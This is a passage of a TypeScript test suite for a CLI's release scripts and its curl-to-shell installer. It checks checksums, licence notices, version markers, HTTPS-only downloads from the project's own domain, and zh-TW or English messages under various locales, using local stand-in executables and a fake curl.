      [DARWIN_ARM64, '/bin/zsh', '~/.zshrc'],
      [DARWIN_ARM64, '/bin/bash', '~/.bash_profile'],
      [LINUX_X64, '/bin/bash', '~/.bashrc'],
      [LINUX_X64, '/usr/bin/fish', '~/.profile'],
    ];
    for (const [target, shell, file] of cases) {
      const f = await faked(target, { SHELL: shell });
      const result = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], f.env);
      expect(result.code).toBe(0);
      expect(result.out).toContain(`Add this line to ${file}, then open a new terminal:`);
      expect(result.out).toContain(`export PATH="${join(f.prefix, 'bin')}:$PATH"`);
    }
    const f = await faked(LINUX_X64);
    const onPath = await runShell('/bin/sh', [INSTALL, '--base-url', release.base, '--prefix', f.prefix], { ...f.env, PATH: `${join(f.prefix, 'bin')}:${f.env['PATH'] as string}` });
    expect(onPath.code).toBe(0);
    expect(onPath.out).not.toContain('is not on your PATH');
  });
});

describe('scripts/release-assets.sh → the R2 layout → install.sh (https://downloads.smurg.ai)', () => {
  /** The version's own prefix on the downloads domain: the default download location release-assets.sh bakes in. */
  const BASE = 'https://downloads.smurg.ai/v9.8.7';
  const INSTALL_LINE = 'curl -fsSL https://smurg.ai/install.sh | sh';
  /** The Node.js release the stand-in executables are copies of, and whose LICENSE their notices carry. */
  const FAKE_NODE = '22.23.3';
  /** Notices as scripts/build-sea.sh writes them: the packages, then the Node.js section with its LICENSE. */
  const noticesOf = (node: string): string =>
    `smurg: third-party notices\n\nnode-pty@1.2.0  MIT\n@parcel/watcher@2.6.0  MIT\n\n${'='.repeat(80)}\nnode@${node} (the Node.js runtime)\nLicense: MIT\n\n----- LICENSE -----\nNode.js is licensed for use as follows:\n\nCopyright Node.js contributors. All rights reserved.\n`;
  const NOTICES_TEXT = noticesOf(FAKE_NODE);
  const SECTION = 'The first version ([host guide](docs/HOSTING.md#1-install), [elsewhere](https://example.com/x), [anchor](#known-limits)).\n\n### Known limits\n\n- Many.\n';
  const CHANGELOG = `# Changelog\n\n## [9.9.0] - later\n\n- not this one\n\n## [9.8.7] - 2026-10-01\n\n${SECTION}\n## [9.8.6] - 2026-09-30\n\n- older\n`;

  /**
   * A stand-in executable of `version` on Node.js `node`: it carries what release-assets.sh reads from every executable
   * (the build marker scripts/build-sea.sh writes, the download URL of its Node.js release: scripts/release-markers.ts),
   * and this machine's one is run: it says its version and Node.js as `smurg --version` does.
   */
  const fakeOf = (name: string, version: string, node = FAKE_NODE): string =>
    `#!/bin/sh\n# smurg-build-version=${version};\n# https://nodejs.org/download/release/v${node}/\n[ -z "\${FAKE_LOG:-}" ] || echo "run ${name} $*" >>"$FAKE_LOG"\n${NOT_SHARING}echo "smurg ${version} (fake ${name}, node ${node})"\n`;

  async function releaseDirs(
    dirs: Dirs,
    options: { readonly names?: readonly string[]; readonly sub?: string; readonly version?: string; readonly notices?: string | null } = {},
  ): Promise<{ dist: string; out: string; notes: string; changelog: string }> {
    const version = options.version ?? '9.8.7';
    const base = join(dirs.home, options.sub ?? 'r');
    const dist = join(base, 'dist');
    const names = options.names ?? TARGETS.map((t) => t.name);
    for (const name of names) await writeExecutable(join(dist, name), fakeOf(name, version));
    // Downloaded CI artifacts lose their mode bits: the host's copy is not executable here.
    if (names.includes(HOST_NAME)) await chmod(join(dist, HOST_NAME), 0o644);
    // scripts/build-sea.sh writes the notices next to the executable; the release workflow puts them into the dist.
    if (options.notices !== null) await writeFile(join(dist, 'THIRD-PARTY-NOTICES.txt'), options.notices ?? NOTICES_TEXT);
    const changelog = join(base, 'CHANGELOG.md');
    await writeFile(changelog, CHANGELOG);
    return { dist, out: join(base, 'out'), notes: join(base, 'notes', 'notes.md'), changelog };
  }

  const assets = (args: readonly string[]): Promise<Run> => runShell('/bin/bash', [RELEASE_ASSETS, ...args], { PATH: SYSTEM_PATH, HOME: '/nonexistent' });

  /** A stand-in curl that serves https://downloads.smurg.ai/<key> from <bucket>/<key> (and nothing else), logging each call. */
  async function r2Curl(f: Faked, bucket: string): Promise<void> {
    await writeExecutable(
      join(f.dirs.home, 'fakebin', 'curl'),
      `#!/bin/sh\nout=''; prev=''; url=''\nfor a in "$@"; do [ "$prev" = -o ] && out="$a"; prev="$a"; url="$a"; done\necho "curl $*" >>"$FAKE_LOG"\ncase "$url" in\n  https://downloads.smurg.ai/*) src='${bucket}'/"\${url#https://downloads.smurg.ai/}"; [ -f "$src" ] || exit 22; cp "$src" "$out" ;;\n  *) exit 6 ;;\nesac\n`,
    );
  }

  /** The bucket as scripts/publish-downloads.sh leaves it: v<version>/ for each, latest/ = the last one. */
  async function bucketOf(dirs: Dirs, releases: readonly [string, string][]): Promise<string> {
    const bucket = join(dirs.home, 'bucket');
    for (const [version, out] of releases) {
      await mkdir(join(bucket, `v${version}`), { recursive: true });
      for (const name of [...TARGETS.map((t) => t.name), 'SHA256SUMS', 'install.sh', 'THIRD-PARTY-NOTICES.txt']) {
        await writeFile(join(bucket, `v${version}`, name), await readFile(join(out, name)));
      }
    }
    const [latest] = releases.at(-1) as [string, string];
    await mkdir(join(bucket, 'latest'), { recursive: true });
    await writeFile(join(bucket, 'latest', 'install.sh'), await readFile(join(bucket, `v${latest}`, 'install.sh')));
    await writeFile(join(bucket, 'latest', 'VERSION'), `${latest}\n`);
    return bucket;
  }

  it('writes the four executables, SHA256SUMS, install.sh with this version’s download location, the notices, and the notes', async () => {
    const dirs = await setup();
    const r = await releaseDirs(dirs);
    const built = await assets(['--version', '9.8.7', '--dist', r.dist, '--out', r.out, '--require-all', '--notes', r.notes, '--changelog', r.changelog]);
    expect(built.out).toContain(`publish (a person, docs/RELEASING.md §4):  scripts/publish-downloads.sh --version 9.8.7 --dist ${r.out}`);
    expect(built.out).toContain(`the install line (the latest published version):  ${INSTALL_LINE}`);
    expect(built.code).toBe(0);
    const sums = await readFile(join(r.out, 'SHA256SUMS'), 'utf8');
    expect(sums).toBe(
      [...TARGETS]
        .sort((a, b) => a.name.localeCompare(b.name))
        .map((t) => `${sha(fakeOf(t.name, '9.8.7'))}  ${t.name}\n`)
        .join(''),
    );
    expect(built.out).toContain(`release-assets: ${HOST_NAME} --version: smurg 9.8.7 (fake ${HOST_NAME}, node ${FAKE_NODE})`);
    for (const target of TARGETS) expect((await stat(join(r.out, target.name))).mode & 0o777).toBe(0o755);
    const script = await readFile(join(r.out, 'install.sh'), 'utf8');
    expect(script.split('\n').filter((line) => line.startsWith('SMURG_RELEASE_BASE_URL='))).toEqual([`SMURG_RELEASE_BASE_URL='${BASE}'`]);
    expect(script.replace(`SMURG_RELEASE_BASE_URL='${BASE}'`, "SMURG_RELEASE_BASE_URL=''")).toBe(await readFile(INSTALL, 'utf8'));
    expect((await stat(join(r.out, 'install.sh'))).mode & 0o777).toBe(0o755);
    expect(await readFile(join(r.out, 'THIRD-PARTY-NOTICES.txt'), 'utf8')).toBe(NOTICES_TEXT);
    expect((await stat(join(r.out, 'THIRD-PARTY-NOTICES.txt'))).mode & 0o777).toBe(0o644);
    expect((await readdir(r.out)).sort()).toEqual(['SHA256SUMS', 'THIRD-PARTY-NOTICES.txt', 'install.sh', ...TARGETS.map((t) => t.name)].sort());

    // The notes: the version's section as written, then a heading of release-assets.sh's own, the one install line
    // and the checksums. No other install command.
    const notes = await readFile(r.notes, 'utf8');
    expect(notes.startsWith(`${SECTION}\n## `)).toBe(true);
    expect(notes).not.toContain('not this one');
    expect(notes).not.toContain('older');
    expect(notes.split('\n').filter((line) => line.includes('curl'))).toEqual([INSTALL_LINE]);
    expect(notes).toContain(sums);
  });

  it('`curl -fsSL https://smurg.ai/install.sh | sh` on the R2 layout: latest/install.sh installs its own version from its own prefix', async () => {
    const dirs = await setup();
    const older = await releaseDirs(dirs, { sub: 'old', version: '9.8.6' });
    const current = await releaseDirs(dirs, { sub: 'new' });
    expect((await assets(['--version', '9.8.6', '--dist', older.dist, '--out', older.out, '--require-all'])).code).toBe(0);
    expect((await assets(['--version', '9.8.7', '--dist', current.dist, '--out', current.out, '--require-all'])).code).toBe(0);
    const bucket = await bucketOf(dirs, [
      ['9.8.6', older.out],
      ['9.8.7', current.out],
    ]);
    const f = await faked(LINUX_X64);
    await r2Curl(f, bucket);
    // https://smurg.ai/install.sh is a 302 to latest/install.sh: what `sh` reads is that file.
    const latest = await readFile(join(bucket, 'latest', 'install.sh'), 'utf8');
    for (const shell of SHELLS) {
      const result = await runShell(shell, ['-s'], f.env, latest);
      expect(result.out).toContain(`smurg 9.8.7 (fake smurg-linux-x64, node ${FAKE_NODE})`);
      expect(result.code).toBe(0);
      expect(result.out).toContain('  License of smurg (MIT, open source): https://smurg.ai/license/\n');
      expect(result.out).toContain(`  Licenses of the third-party components: ${BASE}/THIRD-PARTY-NOTICES.txt\n`);
      // The next steps: the built-in relay, or any other relay.
      expect(result.out).toContain('(another relay: add --relay <URL>)');
    }
    expect(await readFile(join(f.dirs.home, '.local', 'bin', 'smurg'), 'utf8')).toBe(fakeOf('smurg-linux-x64', '9.8.7'));
    const fetched = (await f.calls()).filter((call) => call.startsWith('curl '));
    expect(fetched.length).toBe(2 * SHELLS.length);
    for (const call of fetched) {
      expect(call).toContain('--proto =https --proto-redir =https');
      expect(call).toMatch(/ https:\/\/downloads\.smurg\.ai\/v9\.8\.7\/(SHA256SUMS|smurg-linux-x64)$/);
    }

    // A version's own installer keeps installing that version (curl -fsSL https://downloads.smurg.ai/v9.8.6/install.sh | sh).
    const pinned = await faked(LINUX_X64);
    await r2Curl(pinned, bucket);
    const old = await runShell('/bin/sh', ['-s'], pinned.env, await readFile(join(bucket, 'v9.8.6', 'install.sh'), 'utf8'));
    expect(old.code).toBe(0);
    expect(await readFile(join(pinned.dirs.home, '.local', 'bin', 'smurg'), 'utf8')).toBe(fakeOf('smurg-linux-x64', '9.8.6'));
    expect((await pinned.calls()).filter((call) => call.startsWith('curl ')).every((call) => call.includes(' https://downloads.smurg.ai/v9.8.6/'))).toBe(true);
  });

  it('--base-url bakes another download location (a test elsewhere); the notes still give only the install line', async () => {
    const dirs = await setup();
    const r = await releaseDirs(dirs);
    const other = 'https://staging.example.test/smurg/v9.8.7/';
    const built = await assets(['--version', '9.8.7', '--base-url', other, '--dist', r.dist, '--out', r.out, '--notes', r.notes, '--changelog', r.changelog]);
    expect(built.code).toBe(0);
    expect(built.out).toContain("this version's installer:  curl -fsSL https://staging.example.test/smurg/v9.8.7/install.sh | sh");
    expect((await readFile(join(r.out, 'install.sh'), 'utf8')).split('\n').filter((line) => line.startsWith('SMURG_RELEASE_BASE_URL='))).toEqual([
      "SMURG_RELEASE_BASE_URL='https://staging.example.test/smurg/v9.8.7'",
    ]);
    expect((await readFile(r.notes, 'utf8')).split('\n').filter((line) => line.includes('curl'))).toEqual([INSTALL_LINE]);
  });

  it('refuses a release that misses a platform (--require-all), a changelog without the version, a wrong version', async () => {
    const dirs = await setup();
    const partial = await releaseDirs(dirs, { names: ['smurg-darwin-arm64', 'smurg-linux-x64', HOST_NAME], sub: 'partial' });
    const missing = await assets(['--version', '9.8.7', '--dist', partial.dist, '--out', partial.out, '--require-all']);
    expect(missing.code).not.toBe(0);
    expect(missing.out).toMatch(/missing in .*: .*smurg-/);
    expect(existsSync(partial.out)).toBe(false);

    // Without this machine's executable nothing is run, so the changelog is what refuses 9.8.8.
    const others = await releaseDirs(dirs, { names: TARGETS.map((t) => t.name).filter((name) => name !== HOST_NAME), sub: 'others' });
    const noSection = await assets(['--version', '9.8.8', '--dist', others.dist, '--out', others.out, '--notes', others.notes, '--changelog', others.changelog]);
    expect(noSection.code).not.toBe(0);
    expect(noSection.out).toContain('has no section for 9.8.8');
    expect(existsSync(others.notes)).toBe(false);

    // Every executable must be the release's build (its build marker), and this machine's must also report exactly the
    // release's version when it runs.
    const full = await releaseDirs(dirs, { sub: 'full' });
    const wrong = await assets(['--version', '9.8.8', '--dist', full.dist, '--out', full.out]);
    expect(wrong.code).not.toBe(0);
    for (const target of TARGETS) expect(wrong.out).toContain(`${target.name} was built as smurg 9.8.7, not 9.8.8`);
    expect(existsSync(full.out)).toBe(false);
    const lying = await releaseDirs(dirs, { sub: 'lying', version: '9.8.8' });
    await writeExecutable(join(lying.dist, HOST_NAME), fakeOf(HOST_NAME, '9.8.8').replace('echo "smurg 9.8.8', 'echo "smurg 9.8.7'));
    const ran = await assets(['--version', '9.8.8', '--dist', lying.dist, '--out', lying.out]);
    expect(ran.code).not.toBe(0);
    expect(ran.out).toContain(`${HOST_NAME} reports 'smurg 9.8.7 (fake ${HOST_NAME}, node ${FAKE_NODE})', not smurg 9.8.8`);

    const tag = await assets(['--version', 'v9.8.7', '--dist', full.dist, '--out', full.out]);
    expect(tag.code).toBe(2);
    expect(tag.out).toContain('no leading v');
    const http = await assets(['--version', '9.8.7', '--base-url', 'http://example.invalid/x', '--dist', full.dist, '--out', full.out]);
    expect(http.code).toBe(2);
  });

  it('refuses to assemble without the third-party notices, or with notices that do not name what the executables bundle', async () => {
    const dirs = await setup();
    const none = await releaseDirs(dirs, { sub: 'none', notices: null });
    const missing = await assets(['--version', '9.8.7', '--dist', none.dist, '--out', none.out, '--require-all']);
    expect(missing.code).toBe(1);
    expect(missing.out).toContain(`${none.dist}/THIRD-PARTY-NOTICES.txt is missing`);
    expect(missing.out).toContain('--notices FILE');
    expect(existsSync(none.out)).toBe(false);

    const empty = await releaseDirs(dirs, { sub: 'empty', notices: '' });
    const emptied = await assets(['--version', '9.8.7', '--dist', empty.dist, '--out', empty.out]);
    expect(emptied.code).toBe(1);
    expect(emptied.out).toContain('THIRD-PARTY-NOTICES.txt is empty');
    expect(existsSync(empty.out)).toBe(false);

    const partial = await releaseDirs(dirs, { sub: 'partial', notices: 'node-pty  MIT\nNode.js\n' });
    const short = await assets(['--version', '9.8.7', '--dist', partial.dist, '--out', partial.out]);
    expect(short.code).toBe(1);
    expect(short.out).toContain('does not mention @parcel/watcher (bundled in every executable)');
    expect(existsSync(partial.out)).toBe(false);

    // Nothing of the guest sandbox is required (there is none: ARCHITECTURE §11 D-15).
    expect(NOTICES_TEXT).not.toContain('sandbox-runtime');

    // --notices names another file.
    const elsewhere = join(dirs.home, 'notices.txt');
    await writeFile(elsewhere, `${NOTICES_TEXT}(from elsewhere)\n`);
    const given = await assets(['--version', '9.8.7', '--dist', none.dist, '--out', none.out, '--notices', elsewhere]);
    expect(given.code).toBe(0);
    expect(await readFile(join(none.out, 'THIRD-PARTY-NOTICES.txt'), 'utf8')).toBe(`${NOTICES_TEXT}(from elsewhere)\n`);
  });

  it('refuses notices that are not complete: the committed file (its Node.js section a placeholder), or no Node.js section', async () => {
    const dirs = await setup();
    // The repository's own packages/cli/THIRD-PARTY-NOTICES.txt names every component, Node.js included (the heading of
    // its placeholder section), but it is not what a release publishes.
    const committed = fileURLToPath(new URL('../THIRD-PARTY-NOTICES.txt', import.meta.url));
    const r = await releaseDirs(dirs, { sub: 'committed' });
    const unfilled = await assets(['--version', '9.8.7', '--dist', r.dist, '--out', r.out, '--require-all', '--notices', committed]);
    expect(unfilled.code).toBe(1);
    expect(unfilled.out).toContain('is the committed packages/cli/THIRD-PARTY-NOTICES.txt, whose Node.js section is still the placeholder');
    expect(existsSync(r.out)).toBe(false);

    for (const [sub, notices] of [
      ['heading-only', NOTICES_TEXT.replace(`node@${FAKE_NODE} (the Node.js runtime)`, 'Node.js runtime')],
      ['no-license', NOTICES_TEXT.replace('Node.js is licensed for use as follows:', 'see nodejs.org')],
      ['twice', `${NOTICES_TEXT}node@22.0.0 (the Node.js runtime)\n`],
    ] as const) {
      const partial = await releaseDirs(dirs, { sub, notices });
      const refused = await assets(['--version', '9.8.7', '--dist', partial.dist, '--out', partial.out]);
      expect(refused.code, sub).toBe(1);
      expect(refused.out, sub).toContain('has no complete Node.js section');
      expect(existsSync(partial.out), sub).toBe(false);
    }
  });

  it('every executable must be this version’s build, on the Node.js whose LICENSE the notices carry (a release assembled by hand)', async () => {
    const dirs = await setup();
    // Three executables left over from 9.8.6 next to this machine's 9.8.7 build (docs/RELEASING.md §4.3 mixes builds
    // from two places): refused, each named, before anything is written.
    const stale = await releaseDirs(dirs, { sub: 'stale' });
    for (const target of TARGETS) if (target.name !== HOST_NAME) await writeExecutable(join(stale.dist, target.name), fakeOf(target.name, '9.8.6'));
    const mixed = await assets(['--version', '9.8.7', '--dist', stale.dist, '--out', stale.out, '--require-all']);
    expect(mixed.code).toBe(1);
    expect(mixed.out).toContain('these are not the executables of smurg 9.8.7');
    for (const target of TARGETS) {
      if (target.name === HOST_NAME) expect(mixed.out).not.toContain(`${target.name} was built`);
      else expect(mixed.out).toContain(`${target.name} was built as smurg 9.8.6, not 9.8.7`);
    }
    expect(existsSync(stale.out)).toBe(false);

    // No build marker at all (not built by scripts/build-sea.sh --version), and no Node.js release URL.
    const bare = await releaseDirs(dirs, { sub: 'bare' });
    await writeExecutable(join(bare.dist, 'smurg-linux-arm64'), fakeBinary('smurg-linux-arm64'));
    const unmarked = await assets(['--version', '9.8.7', '--dist', bare.dist, '--out', bare.out]);
    expect(unmarked.code).toBe(1);
    expect(unmarked.out).toContain('smurg-linux-arm64 was built as smurg (no build marker');
    expect(unmarked.out).toContain('smurg-linux-arm64 is Node.js (none');

    // One executable on another Node.js release (another runner's cache, or the arm64 machine of §4.3).
    const other = await releaseDirs(dirs, { sub: 'other-node' });
    await writeExecutable(join(other.dist, 'smurg-linux-arm64'), fakeOf('smurg-linux-arm64', '9.8.7', '22.23.2'));
    const differs = await assets(['--version', '9.8.7', '--dist', other.dist, '--out', other.out]);
    expect(differs.code).toBe(1);
    expect(differs.out).toContain(`smurg-linux-arm64 is Node.js 22.23.2, but the notices have the LICENSE of Node.js ${FAKE_NODE}`);

    // The notices of another build (another Node.js): every executable disagrees with them.
    const otherNotices = await releaseDirs(dirs, { sub: 'other-notices', notices: noticesOf('22.22.1') });
    const notThese = await assets(['--version', '9.8.7', '--dist', otherNotices.dist, '--out', otherNotices.out]);
    expect(notThese.code).toBe(1);
    for (const target of TARGETS) expect(notThese.out).toContain(`${target.name} is Node.js ${FAKE_NODE}, but the notices have the LICENSE of Node.js 22.22.1`);

    // This machine's executable runs on another Node.js than its markers say: its --version tells.
    const runs = await releaseDirs(dirs, { sub: 'runs' });
    await writeExecutable(join(runs.dist, HOST_NAME), fakeOf(HOST_NAME, '9.8.7').replace(`, node ${FAKE_NODE})"`, ', node 22.0.0)"'));
    const ranOn = await assets(['--version', '9.8.7', '--dist', runs.dist, '--out', runs.out]);
    expect(ranOn.code).toBe(1);
    expect(ranOn.out).toContain(`${HOST_NAME} reports 'smurg 9.8.7 (fake ${HOST_NAME}, node 22.0.0)': not Node.js ${FAKE_NODE}`);
  });

  it('--check-arch refuses a file that is not the executable its name says', async () => {
    const dirs = await setup();
    const r = await releaseDirs(dirs);
    const result = await assets(['--version', '9.8.7', '--dist', r.dist, '--out', r.out, '--check-arch']);
    expect(result.code).not.toBe(0);
    expect(result.out).toContain('is not the executable its name says');
  });
});

describe('scripts/install.sh speaks English, or zh-TW by the rule of the smurg command (pick_lang)', () => {
  const CJK = /[\u3000-\u303f\u3400-\u9fff\uff00-\uffef]/;
  const ENGLISH = 'smurg install: unknown argument --frobnicate (--help shows the usage)\n';
  /** The language the installer picks in this environment: what it says about an argument it does not know. */
  const langOf = async (shell: string, f: Faked, env: Record<string, string>): Promise<'en' | 'zh-TW'> => {
    const { SMURG_LANG: _pinned, ...bare } = f.env;
    const result = await runShell(shell, [INSTALL, '--frobnicate'], { ...bare, ...env }, undefined, { pinLang: false });
    expect(result.code).toBe(2);
    if (result.out === ENGLISH) return 'en';
    expect(result.out).toMatch(/^smurg 安裝：不認得的參數 --frobnicate（--help 查看用法）\n$/);
    return 'zh-TW';
  };

  for (const shell of SHELLS) {
    it(`the shared locale table (${shell}): SMURG_LANG, then the first non-empty of LC_ALL, LC_MESSAGES, LANG; UTF-8 or no codeset only`, async () => {
      // Linux: nothing but the environment decides (no system language to ask).
      const f = await faked(LINUX_X64);
      for (const [env, expected] of ENV_CASES) expect(await langOf(shell, f, env), JSON.stringify(env)).toBe(expected);
      for (const tag of ZH_TW_TAGS) expect(await langOf(shell, f, { LANG: tag }), tag).toBe('zh-TW');
      for (const tag of [...NOT_ZH_TW_TAGS, ...NOT_ZH_TW_IN_ENV]) expect(await langOf(shell, f, { LANG: tag }), tag).toBe('en');
      expect(await langOf(shell, f, { LANG: 'zh_TW.UTF-8@radical' })).toBe('zh-TW');
      expect((await f.calls()).filter((call) => call.startsWith('defaults'))).toEqual([]);
    });

    it(`macOS without any locale set (${shell}): the system's preferred languages decide, the first supported one; a failure is English`, async () => {
      const f = await faked(DARWIN_ARM64);
      const apple = (...tags: string[]): string => `(\n${tags.map((tag) => `    "${tag}"`).join(',\n')}\n)`;
      expect(await langOf(shell, f, { FAKE_APPLE_LANGUAGES: apple('zh-Hant-TW', 'en-TW') })).toBe('zh-TW');
      expect(await langOf(shell, f, { FAKE_APPLE_LANGUAGES: apple('en-US', 'zh-Hant-TW') })).toBe('en');
      expect(await langOf(shell, f, { FAKE_APPLE_LANGUAGES: apple('ja-JP', 'zh-Hant-HK', 'en') })).toBe('zh-TW');
      expect(await langOf(shell, f, { FAKE_APPLE_LANGUAGES: apple('zh-Hans-CN', 'ja-JP') })).toBe('en');
      expect(await langOf(shell, f, {})).toBe('en'); // `defaults` fails
      expect((await f.calls()).filter((call) => call.startsWith('defaults'))).toHaveLength(5);
      // A locale, or SMURG_LANG, decides alone: the system is not asked.
      expect(await langOf(shell, f, { LANG: 'en_US.UTF-8', FAKE_APPLE_LANGUAGES: apple('zh-Hant-TW') })).toBe('en');
      expect(await langOf(shell, f, { LC_ALL: 'C', FAKE_APPLE_LANGUAGES: apple('zh-Hant-TW') })).toBe('en');
      expect(await langOf(shell, f, { SMURG_LANG: 'en', FAKE_APPLE_LANGUAGES: apple('zh-Hant-TW') })).toBe('en');
      expect((await f.calls()).filter((call) => call.startsWith('defaults'))).toHaveLength(5);
      // On Linux the same environment is English: there is no AppleLanguages to read.
      const linux = await faked(LINUX_X64);
      expect(await langOf(shell, linux, { FAKE_APPLE_LANGUAGES: apple('zh-Hant-TW') })).toBe('en');
    });

    it(`the whole installation in zh-TW under LANG=zh_TW.UTF-8 (${shell}), and in ASCII-only English otherwise`, async () => {
      const release = await serve(fullRelease());
      const zh = await faked(LINUX_X64, { SMURG_LANG: '', LANG: 'zh_TW.UTF-8' });
      const chinese = await runShell(shell, [INSTALL, '--base-url', release.base, '--prefix', zh.prefix], zh.env, undefined, { pinLang: false });
      expect(chinese.code).toBe(0);
      expect(chinese.out).toContain(`smurg 安裝：下載 smurg-linux-x64（${release.base}）…\n`);
      expect(chinese.out).toContain('\nsmurg 安裝完成：\n');
      expect(chinese.out).toContain(`  執行檔：${zh.prefix}/bin/smurg（smurg 9.8.7 (fake smurg-linux-x64)）\n`);
      expect(chinese.out).toContain('  smurg 的授權條款（MIT，開放原始碼）：https://smurg.ai/zh-TW/license/\n');
      expect(chinese.out).toContain(`  第三方元件的授權條款：${release.base}/THIRD-PARTY-NOTICES.txt\n`);
      expect(chinese.out).toContain('\n下一步：\n  smurg login ');
      expect(chinese.out).toContain('（其他 relay：加上 --relay <網址>）');
      expect(chinese.out).toContain('說明：https://smurg.ai/zh-TW/docs/hosting/\n');
      expect(chinese.out).not.toMatch(/smurg install:|Next steps|is installed/);

      const en = await faked(LINUX_X64, { LANG: 'zh_TW.UTF-8', LC_ALL: 'C', SMURG_LANG: '' });
      const english = await runShell(shell, [INSTALL, '--base-url', release.base, '--prefix', en.prefix], en.env, undefined, { pinLang: false });
      expect(english.code).toBe(0);
      expect(english.out).toContain(`smurg install: downloading smurg-linux-x64 (${release.base})...\n`);
      expect(english.out).toContain('\nsmurg is installed:\n');
      expect(english.out).toContain(`  Executable: ${en.prefix}/bin/smurg (smurg 9.8.7 (fake smurg-linux-x64))\n`);
      expect(english.out).toContain('  License of smurg (MIT, open source): https://smurg.ai/license/\n');
      expect(english.out).toContain('Guide: https://smurg.ai/docs/hosting/\n');
      // Safe under LANG=C: not one byte outside ASCII.
      // eslint-disable-next-line no-control-regex
      expect(english.out).toMatch(/^[\x00-\x7f]*$/);
    });
  }

  it('under every non-UTF-8 locale this machine has (Big5, GB2312, eucJP, SJIS, ISO8859-x, ...): English, never a syntax error', async () => {
    // bash reads a script in the locale in force: under a non-UTF-8 multibyte locale the UTF-8 bytes of the zh-TW texts
    // used to end in "syntax error near unexpected token `('". The installer now switches the shell to the C locale
    // on its first lines, before any such text is read (and keeps the person's locale for pick_lang).
    const listed = await new Promise<string>((resolve) => execFile('/usr/bin/locale', ['-a'], { env: { PATH: SYSTEM_PATH } }, (_err, stdout) => resolve(String(stdout))));
    const installed = listed.split('\n').filter((name) => /^[A-Za-z0-9_@.-]+$/.test(name) && /\./.test(name) && !/\.utf-?8(@|$)/i.test(name));
    // The multibyte ones that broke, whether this machine lists them or not (an unknown locale name must not matter).
    const locales = [...new Set([...installed, 'zh_CN.GB2312', 'zh_CN.eucCN', 'zh_CN.GBK', 'zh_CN.GB18030', 'ja_JP.eucJP', 'ja_JP.SJIS', 'ko_KR.eucKR', 'zh_TW.Big5', 'zh_HK.Big5HKSCS'])];
    const f = await faked(LINUX_X64);
    const { SMURG_LANG: _pinned, ...bare } = f.env;
    const shells = [...new Set([...SHELLS, '/bin/bash'].filter((shell) => existsSync(shell)))];
    // Linux bash says, before it reads the script, that a locale is not installed on the machine: not the installer's.
    const ownOutput = (out: string): string => out.replace(/^.*: warning: setlocale: .*\n/gm, '');
    const runs: Promise<void>[] = [];
    const failures: string[] = [];
    for (const shell of shells) {
      for (const locale of locales) {
        for (const variable of ['LANG', 'LC_ALL', 'LC_MESSAGES']) {
          runs.push(
            runShell(shell, [INSTALL, '--frobnicate'], { ...bare, [variable]: locale }, undefined, { pinLang: false }).then((result) => {
              if (result.code !== 2 || ownOutput(result.out) !== ENGLISH) failures.push(`${shell} ${variable}=${locale}: exit ${result.code}: ${result.out.trim()}`);
            }),
          );
          if (runs.length >= 16) await Promise.all(runs.splice(0));
        }
      }
    }
    await Promise.all(runs);
    expect(failures).toEqual([]);
    // As `curl ... | sh` (the script on stdin, read piece by piece) and all the way through an installation.
    const release = await serve(fullRelease());
    const script = await readFile(INSTALL, 'utf8');
    for (const shell of shells) {
      for (const locale of ['zh_CN.GB2312', 'ja_JP.eucJP', 'ko_KR.eucKR', 'zh_TW.Big5']) {
        const g = await faked(LINUX_X64, { SMURG_LANG: '', LC_ALL: locale, SMURG_INSTALL_BASE_URL: release.base });
        const result = await runShell(shell, ['-s', '--', '--prefix', g.prefix], g.env, script, { pinLang: false });
        expect(result.out, `${shell} ${locale}`).not.toMatch(/syntax error|unexpected/);
        expect(result.out, `${shell} ${locale}`).toContain('\nsmurg is installed:\n');
        expect(result.code, `${shell} ${locale}`).toBe(0);
        // eslint-disable-next-line no-control-regex
        expect(ownOutput(result.out), `${shell} ${locale}`).toMatch(/^[\x00-\x7f]*$/);
      }
    }
  });

  it('the shell is switched to the C locale before the first zh-TW text of the script', async () => {
    const lines = (await readFile(INSTALL, 'utf8')).split('\n');
    const firstChinese = lines.findIndex((line) => CJK.test(line));
    const switched = lines.indexOf('LC_ALL=C');
    expect(switched).toBeGreaterThan(0);
    expect(lines[switched + 1]).toBe('export LC_ALL');
    expect(switched).toBeLessThan(firstChinese);
    // ... and before any function is defined (a function's body is read when it is defined).
    expect(switched).toBeLessThan(lines.findIndex((line) => /^[a-z_]+\(\) \{/.test(line)));
    for (const saved of ['SMURG_USER_LC_ALL="${LC_ALL:-}"', 'SMURG_USER_LC_MESSAGES="${LC_MESSAGES:-}"', 'SMURG_USER_LANG="${LANG:-}"']) expect(lines.indexOf(saved)).toBeLessThan(switched);
  });

  it('every message has both texts side by side: zh-TW appears only as the second argument of msg / failf, and the English one is ASCII', async () => {
    const lines = (await readFile(INSTALL, 'utf8')).split('\n');
    const call = /(?:^|\s)(?:msg|failf) '((?:[^'\\]|\\.)*)' '((?:[^'\\]|\\.)*)'(?: |$)/;
    let messages = 0;
    lines.forEach((line, index) => {
      const where = `scripts/install.sh:${index + 1}`;
      const match = call.exec(line);
      if (match === null) {
        expect(CJK.test(line), where).toBe(false);
        return;
      }
      messages += 1;
      const [, english, chinese] = match as unknown as [string, string, string];
      // eslint-disable-next-line no-control-regex
      expect(english, where).toMatch(/^[\x20-\x7e]*$/);
      expect(CJK.test(line.replace(`'${chinese}'`, '')), where).toBe(false);
      // The same placeholders, in the same number: the arguments are shared.
      expect((chinese.match(/%s/g) ?? []).length, where).toBe((english.match(/%s/g) ?? []).length);
      expect(`${english}${chinese}`.replace(/%s/g, ''), where).not.toContain('%');
    });
    expect(messages).toBeGreaterThan(35);
  });

  it('says smurg is open source and where the guides are; the next steps offer --relay for any other relay', async () => {
    const script = await readFile(INSTALL, 'utf8');
    expect(script).toContain('(another relay: add --relay <URL>)');
    expect(script).toContain('License of smurg (MIT, open source): https://smurg.ai/license/');
    expect(script).not.toMatch(/proprietary|All rights reserved|maintainer/i);
  });
});

describe('scripts/install.sh from a local server with the R2 layout (v<X.Y.Z>/ and latest/)', () => {
  /** Serves <root>/<path> (the bucket as downloads.smurg.ai serves it; the query string ignored). */
  async function serveBucket(root: string): Promise<Release> {
    const requests: string[] = [];
    const server: Server = createServer((req, res) => {
      requests.push(req.url ?? '');
      const path = (req.url ?? '/').split('?')[0] as string;
      if (path.includes('..')) {
        res.writeHead(404).end();
        return;
      }
      readFile(join(root, path))
        .then((body) => res.writeHead(200, { 'content-type': 'application/octet-stream' }).end(body))
        .catch(() => res.writeHead(404).end());
    });
    await new Promise<void>((resolve) => server.listen({ host: '127.0.0.1', port: 0 }, resolve));
